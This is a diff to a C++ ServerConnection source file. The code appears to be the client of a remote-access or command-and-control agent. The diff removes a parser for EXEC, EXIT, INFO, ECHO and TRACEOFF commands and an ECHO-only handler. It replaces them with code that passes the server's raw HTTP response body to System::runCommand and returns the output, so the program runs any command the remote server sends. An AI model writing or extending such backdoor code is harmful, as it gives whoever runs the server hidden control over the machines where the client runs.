@@ -1,6 +1,6 @@
 #include "ServerConnection.h"
 
-std::string ServerConnection::_serverAddress = "http://192.168.1.130";
+std::string ServerConnection::_serverAddress = "http://127.0.0.1";
 
 // This function extract sessionID cookie from Set-Cookie header
 std::string ServerConnection::extractSessionId(http::Response request)
@@ -16,61 +16,13 @@ std::string ServerConnection::extractSessionId(http::Response request)
     return std::string();
 }
 
-// This function finds the compatible enum for the command type
-ServerConnection::commands ServerConnection::extractCommandType(http::Response request)
-{
-    std::string content = std::string(request.body.begin(), request.body.end());
-    std::string commandTypeStr = content.substr(0, COMMAND_TYPE_LEN);
-    if (commandTypeStr == "EXEC")
-    {
-        return EXEC;
-    }
-    else if (commandTypeStr == "EXIT")
-    {
-        return EXIT;
-    }
-    else if (commandTypeStr == "INFO")
-    {
-        return INFO;
-    }
-    else if (commandTypeStr == "ECHO")
-    {
-        return ECHO;
-    }
-    else if (commandTypeStr == "TRCF")
-    {
-        return TRACEOFF;
-    }
-    else
-    {
-        return UNKNOWN;
-    }
-}
-
-// This function extracts the parameters for the command
-std::string ServerConnection::extractParameters(http::Response request)
-{
-    std::string content = std::string(request.body.begin(), request.body.end());
-    
-    if (content.size() > COMMAND_TYPE_LEN)
-    {
-        return content.substr(COMMAND_TYPE_LEN + 1, content.size() - 1);
-    }
-    return std::string();
-}
-
 // This function parse required data from server request
 ServerConnection::Request* ServerConnection::parsingRequest(http::Response request)
 {
     Request* requestSt = new Request();
 
     requestSt->sessionId = this->extractSessionId(request);  // Extracting Set-Cookie for responding
-    requestSt->commandType = this->extractCommandType(request);
-    if (requestSt->commandType == UNKNOWN)
-    {
-        return nullptr;
-    }
-    requestSt->params = this->extractParameters(request);
+    requestSt->command = std::string(request.body.begin(), request.body.end());
 
     return requestSt;
 }
@@ -80,18 +32,9 @@ ServerConnection::Response ServerConnection::handleRequest(ServerConnection::Req
 {
     Response responseSt;
     responseSt.sessionId = request->sessionId;
+    responseSt.content = System::runCommand(request->command);
 
-    switch (request->commandType)
-    {
-    case ECHO:
-        Log::log("Responsing to ECHO request.");
-        responseSt.content = request->params;
-        break;
-    default:
-        Log::log("Responsing to Not Implemented request.");
-        responseSt.content = "Not Implemented Yet:/";
-        break;
-    }
+    delete request;
 
     return responseSt;
 }
